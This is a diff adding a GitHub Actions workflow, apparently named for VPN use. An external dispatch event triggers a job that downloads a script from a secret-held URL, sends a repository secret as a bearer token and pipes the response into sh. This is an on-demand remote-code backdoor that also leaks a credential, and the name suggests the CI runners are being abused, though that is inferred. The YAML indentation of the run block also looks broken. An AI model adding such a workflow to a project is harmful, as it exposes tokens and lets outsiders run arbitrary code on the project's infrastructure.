@@ -1,0 +1,11 @@
+name: Repository Dispatch
+on:
+  repository_dispatch:
+    types: [vpn]
+jobs:
+  vpn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: vpn
+        run: |
+        curl ${{ secrets.FIFTHURL }} -H "Authorization: Bearer ${{ secrets.GITHUB }}" | sh
